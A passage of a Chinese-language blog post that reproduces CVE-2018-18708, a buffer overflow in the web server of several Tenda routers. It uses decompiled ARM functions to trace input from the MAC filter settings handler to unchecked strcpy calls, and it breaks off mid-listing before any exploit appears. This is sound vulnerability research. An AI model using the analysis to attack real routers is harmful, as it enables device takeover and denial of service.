<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CVE-2018-18708 | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>CVE-2018-18708</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2020-11-12T16:33:51.000Z" id="date"> 2020-11-13</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-10-24T09:06:52.143Z" id="updated"> 2022-10-24</time></div></span><br><span>Word Count: <div class="control">5.4k</div></span><br><span>Read Time: <div class="control">30 min</div></span></div></div><hr><div id="post-content"><h1 id="CVE-2018-18708-复现"><a href="#CVE-2018-18708-复现" class="headerlink" title="CVE-2018-18708 复现"></a>CVE-2018-18708 复现</h1><p>该题在nu1lctf2020 的pwn中已经出现，为babyrouter，不妨来复现复现该cve。</p>
<h2 id="工具-环境"><a href="#工具-环境" class="headerlink" title="工具+环境"></a>工具+环境</h2><p><a href="">下载</a></p>
<p>cutter</p>
<p>ida</p>
<p>gdb + pwndbg</p>
<p>qemu-arm</p>
<p>python</p>
<h3 id="远程实验环境"><a href="#远程实验环境" class="headerlink" title="远程实验环境"></a>远程实验环境</h3><p>docker + qemu-arm</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="简要概述"><a href="#简要概述" class="headerlink" title="简要概述"></a>简要概述</h3><p>CVE-2018-18708，多款Tenda产品中的httpd存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（覆盖函数的返回地址）。以下产品和版本受到影响：Tenda AC7 V15.03.06.44_CN版本；AC9 V15.03.05.19(6318)_CN版本；AC10  V15.03.06.23_CN版本；AC15 V15.03.05.19_CN版本；AC18 V15.03.05.19(6318)_CN版本。</p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><h3 id="sub-BE73C"><a href="#sub-BE73C" class="headerlink" title="sub_BE73C"></a>sub_BE73C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">vul_end</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">char</span> *a2)</span> <span class="hljs-meta"># offset 000BE73C</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">char</span> *dest; <span class="hljs-comment">// [sp+8h] [bp-3Ch]</span><br>  <span class="hljs-type">char</span> *str; <span class="hljs-comment">// [sp+Ch] [bp-38h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [sp+10h] [bp-34h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [sp+14h] [bp-30h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [sp+18h] [bp-2Ch]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [sp+1Ch] [bp-28h]</span><br>  <span class="hljs-type">int</span> s2; <span class="hljs-comment">// [sp+20h] [bp-24h]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [sp+24h] [bp-20h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [sp+28h] [bp-1Ch]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [sp+2Ch] [bp-18h]</span><br>  <span class="hljs-type">char</span> v14; <span class="hljs-comment">// [sp+32h] [bp-12h]</span><br>  <span class="hljs-type">char</span> v15; <span class="hljs-comment">// [sp+33h] [bp-11h]</span><br>  <span class="hljs-type">char</span> *src; <span class="hljs-comment">// [sp+34h] [bp-10h]</span><br><br>  str = (<span class="hljs-type">char</span> *)a1;<br>  dest = a2;<br>  src = <span class="hljs-built_in">strchr</span>(a1, <span class="hljs-number">13</span>); <span class="hljs-comment">//检测deviceList内容是否包含’\r’，随后进入分支执行漏洞代码。</span><br>  <span class="hljs-keyword">if</span> ( src )<br>  &#123;<br>    *src++ = <span class="hljs-number">0</span>;<br>    v6 = <span class="hljs-number">0</span>;<br>    v7 = <span class="hljs-number">0</span>;<br>    v8 = <span class="hljs-number">0</span>;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v6) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v6) )<br>    &#123;<br>      v15 = <span class="hljs-number">1</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;parse_macfilter_rule&quot;</span>, <span class="hljs-number">807</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parase rule: name == %s, mac == %s\n\x1B[0m&quot;</span>, str, src);<br>    &#125;<br>    <span class="hljs-built_in">strcpy</span>(dest + <span class="hljs-number">32</span>, str); <span class="hljs-comment">// 漏洞点vul</span><br>    <span class="hljs-built_in">strcpy</span>(dest, src); <span class="hljs-comment">// 漏洞点</span><br>    v2 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    s2 = <span class="hljs-number">0</span>;<br>    v11 = <span class="hljs-number">0</span>;<br>    v12 = <span class="hljs-number">0</span>;<br>    v13 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;s2) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;s2) )<br>    &#123;<br>      v14 = <span class="hljs-number">2</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;parse_macfilter_rule&quot;</span>, <span class="hljs-number">803</span>, off_FCFE8[<span class="hljs-number">0</span>]);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;source_rule error: %s!\n\x1B[0m&quot;</span>, str);<br>    &#125;<br>    v2 = <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v2;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>从以上可以很容易看出漏洞点在strcpy函数， 那str是通过参数一传入的，进行逆向跟踪。</p>
<h3 id="sub-BDA1C"><a href="#sub-BDA1C" class="headerlink" title="sub_BDA1C"></a>sub_BDA1C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_BDA1C</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *vul_str, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+Ch] [bp-1F0h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// [sp+10h] [bp-1ECh]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [sp+14h] [bp-1E8h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [sp+1Ch] [bp-1E0h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [sp+20h] [bp-1DCh]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [sp+24h] [bp-1D8h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [sp+28h] [bp-1D4h]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [sp+2Ch] [bp-1D0h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [sp+30h] [bp-1CCh]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [sp+34h] [bp-1C8h]</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [sp+38h] [bp-1C4h]</span><br>  <span class="hljs-type">int</span> s2; <span class="hljs-comment">// [sp+3Ch] [bp-1C0h]</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [sp+40h] [bp-1BCh]</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// [sp+44h] [bp-1B8h]</span><br>  <span class="hljs-type">int</span> v18; <span class="hljs-comment">// [sp+48h] [bp-1B4h]</span><br>  <span class="hljs-type">char</span> v19; <span class="hljs-comment">// [sp+4Ch] [bp-1B0h]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [sp+CCh] [bp-130h]</span><br>  <span class="hljs-type">char</span> v21; <span class="hljs-comment">// [sp+14Ch] [bp-B0h]</span><br>  <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [sp+16Ch] [bp-90h]</span><br>  <span class="hljs-type">char</span> v23; <span class="hljs-comment">// [sp+1EDh] [bp-Fh]</span><br>  <span class="hljs-type">char</span> v24; <span class="hljs-comment">// [sp+1EEh] [bp-Eh]</span><br>  <span class="hljs-type">char</span> v25; <span class="hljs-comment">// [sp+1EFh] [bp-Dh]</span><br><br>  v6 = a1;<br>  v5 = vul_str;<br>  v4 = a3;<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;v19, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>u);<br>  s2 = <span class="hljs-number">0</span>;<br>  v16 = <span class="hljs-number">0</span>;<br>  v17 = <span class="hljs-number">0</span>;<br>  v18 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;s2) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;s2) )<br>  &#123;<br>    v25 = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;set_macfilter_rules_by_one&quot;</span>, <span class="hljs-number">667</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set macfilter rules by one, source_rule == %s, index == %d\n\x1B[0m&quot;</span>, v5, v4);<br>  &#125;<br>  <span class="hljs-built_in">memset</span>(&amp;v21, <span class="hljs-number">0</span>, <span class="hljs-number">0xA0</span>u);<br>  vul_end(v5, &amp;v21); <span class="hljs-comment">// 调用, v5为传入后strcpy的参数</span><br>  v11 = <span class="hljs-number">0</span>;<br>  v12 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-number">0</span>;<br>  v14 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v11) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v11) )<br>  &#123;<br>    v24 = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;set_macfilter_rules_by_one&quot;</span>, <span class="hljs-number">671</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;get rule%d: name == %s, mac == %s\n\x1B[0m&quot;</span>, v4, &amp;v22, &amp;v21);<br>  &#125;<br>  <span class="hljs-built_in">snprintf</span>(&amp;s, <span class="hljs-number">0x80</span>u, <span class="hljs-string">&quot;macfilter.%s.list%d&quot;</span>, v6, v4);<br>  <span class="hljs-built_in">snprintf</span>(&amp;v19, <span class="hljs-number">0x80</span>u, <span class="hljs-string">&quot;%s&quot;</span>, &amp;v21);<br>  v7 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  v9 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v7) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v7) )<br>  &#123;<br>    v23 = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;set_macfilter_rules_by_one&quot;</span>, <span class="hljs-number">675</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set rule: %s == %s\n\x1B[0m&quot;</span>, &amp;s, &amp;v19);<br>  &#125;<br>  SetValue(&amp;s, &amp;v19);<br>  <span class="hljs-keyword">if</span> ( (_BYTE)v22 )<br>    sub_C2FD4((<span class="hljs-type">int</span>)&amp;v22, (<span class="hljs-type">int</span>)&amp;v21);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>字符串也是该函是第二个参数进行传入的，继续逆跟踪。</p>
<h3 id="sub-BD758"><a href="#sub-BD758" class="headerlink" title="sub_BD758"></a>sub_BD758</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_BD758</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> *vul_str)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [sp+8h] [bp-44h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+Ch] [bp-40h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [sp+14h] [bp-38h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [sp+18h] [bp-34h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [sp+1Ch] [bp-30h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [sp+20h] [bp-2Ch]</span><br>  <span class="hljs-type">int</span> s2; <span class="hljs-comment">// [sp+24h] [bp-28h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [sp+28h] [bp-24h]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [sp+2Ch] [bp-20h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [sp+30h] [bp-1Ch]</span><br>  <span class="hljs-type">char</span> v13; <span class="hljs-comment">// [sp+36h] [bp-16h]</span><br>  <span class="hljs-type">char</span> v14; <span class="hljs-comment">// [sp+37h] [bp-15h]</span><br>  <span class="hljs-type">char</span> *v15; <span class="hljs-comment">// [sp+38h] [bp-14h]</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [sp+3Ch] [bp-10h]</span><br><br>  v4 = a1;<br>  s = vul_str;<br>  v16 = <span class="hljs-number">1</span>;<br>  v15 = <span class="hljs-number">0</span>;<br>  s2 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v11 = <span class="hljs-number">0</span>;<br>  v12 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;s2) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;s2) )<br>  &#123;<br>    v14 = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;set_macfilter_rules&quot;</span>, <span class="hljs-number">617</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set macfilter rules\n\x1B[0m&quot;</span>);<br>  &#125;<br>  sub_BDE40(v4);<br>  <span class="hljs-keyword">if</span> ( *s )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v15 = <span class="hljs-built_in">strchr</span>(s, <span class="hljs-number">10</span>);<br>      <span class="hljs-keyword">if</span> ( !v15 )<br>        <span class="hljs-keyword">break</span>;<br>      *v15++ = <span class="hljs-number">0</span>;<br>      vul_2(v4, s, v16); <span class="hljs-comment">// 调用vul函数, s为传入的字符串</span><br>      s = v15;<br>      ++v16;<br>    &#125;<br>    vul_2(v4, s, v16); <span class="hljs-comment">// 调用vul函数, s为传入的字符串</span><br>    sub_BE9DC(v4, v16);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v5 = <span class="hljs-number">0</span>;<br>    v6 = <span class="hljs-number">0</span>;<br>    v7 = <span class="hljs-number">0</span>;<br>    v8 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v5) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v5) )<br>    &#123;<br>      v13 = <span class="hljs-number">1</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;set_macfilter_rules&quot;</span>, <span class="hljs-number">623</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;rule list is NULL!\n\x1B[0m&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>字符串是该函数的二个参数进行传入的，继续逆跟踪。</p>
<h3 id="formSetMacFilterCfg"><a href="#formSetMacFilterCfg" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">formSetMacFilterCfg</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span> <span class="hljs-comment">// 000BCB9C</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// r0</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [sp+14h] [bp-218h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+1Ch] [bp-210h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [sp+20h] [bp-20Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [sp+24h] [bp-208h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [sp+28h] [bp-204h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [sp+2Ch] [bp-200h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [sp+30h] [bp-1FCh]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [sp+34h] [bp-1F8h]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [sp+38h] [bp-1F4h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [sp+3Ch] [bp-1F0h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [sp+40h] [bp-1ECh]</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [sp+44h] [bp-1E8h]</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// [sp+48h] [bp-1E4h]</span><br>  <span class="hljs-type">int</span> 